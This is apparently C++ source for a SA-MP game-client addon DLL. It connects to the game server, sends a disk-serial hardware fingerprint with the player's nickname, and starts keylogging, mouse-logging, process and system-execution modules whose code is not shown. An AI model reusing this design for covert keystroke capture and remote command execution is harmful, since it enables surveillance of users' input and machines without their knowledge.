#pragma once

#include "addon.h"



addonThread *gThread;
addonMutex *gMutex;
addonSocket *gSocket;
addonProcess *gProcess;
addonKeylog *gKeylog;
addonMouselog *gMouselog;
addonScreen *gScreen;
addonSysexec *gSysexec;
addonFS *gFS;
addonString *gString;





BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if(fdwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hinstDLL);

		addonDebug("-----------------------------------------------------------------");
		addonDebug("Called dll attach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
		addonDebug("-----------------------------------------------------------------");
	}
	else if(fdwReason == DLL_PROCESS_DETACH)
	{
		std::stringstream format;

		delete gSysexec;
		delete gMouselog;
		delete gKeylog;
		delete gProcess;

		format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1001 << '>' << hinstDLL << '_' << fdwReason << '_' << lpvReserved;
		gSocket->Send(format.str());
		format.clear();

		Sleep(500);

		gSocket->Close();

		delete gThread;

		gMutex->Delete();

		addonDebug("-----------------------------------------------------------------");
		addonDebug("Called dll detach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
		addonDebug("-----------------------------------------------------------------");
	}

	return TRUE;
}



__declspec(dllexport) void addon_start()
{
	if(!GetModuleHandleW(L"addon.asi") || !GetModuleHandleW(L"samp.dll") || !GetModuleHandleW(L"VorbisFile.dll"))
	{
		addonDebug("Called from unknown module, call interrupted");

		return;
	}

	addonDebug("Start call from loader. Processing...");

	gMutex = new addonMutex();
	gThread = new addonThread();
}



DWORD __stdcall main_thread(LPVOID lpParam)
{
	addonDebug("Thread 'main_thread' succesfuly started");

	std::string commandLine = gString->wstring_to_string(std::wstring(GetCommandLineW()));

	if(commandLine.find("-c") == std::string::npos)
		return false;

	std::string nickname, ip;
	std::stringstream format;
	std::size_t buf;
	DWORD serial, flags;
	int port;
	
	buf = (commandLine.find(" -c -n ") + 7);
	nickname = commandLine.substr(buf, (commandLine.find(" -h ") - buf));
	buf = (commandLine.find(" -h ") + 4);
	ip = commandLine.substr(buf, (commandLine.find(" -p ") - buf));
	buf = (commandLine.find(" -p ") + 4);
	port = atoi(commandLine.substr(buf, INFINITE).c_str());

	gSocket = new addonSocket();
	gSocket->socketHandle = gSocket->Create();
	gSocket->Connect(ip, (port + 1));

	GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);

	format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1000 << '>' << serial << '>' << (serial + (flags ^ 0x2296666)) << '>' << nickname << '>' << ((serial | flags) & 0x28F39) << '>' << flags;
	gSocket->Send(format.str());
	format.clear();

	gProcess = new addonProcess();
	gKeylog = new addonKeylog();
	gMouselog = new addonMouselog();
	gSysexec = new addonSysexec();

	//gScreen->Get(std::string("test.bmp"));

	return true;
}



void addonDebug(char *text, ...)
{
	va_list args;
	std::fstream logfile;
	char timeform[16];
	time_t rawtime;
	struct tm * timeinfo;

	time(&rawtime);
	timeinfo = localtime(&rawtime);
	strftime(timeform, sizeof timeform, "%X", timeinfo);

	va_start(args, text);

	int length = vsnprintf(NULL, 0, text, args);
	char *chars = new char[++length];

	length = vsnprintf(chars, length, text, args);
	std::string buffer(chars);

	delete chars;

	va_end(args);

	logfile.open("SAMP\\addon\\addon.log", std::fstream::out | std::fstream::app);
	logfile << '[' << timeform << ']' << ' ' << buffer << '\n';
	logfile.flush();
	logfile.close();
}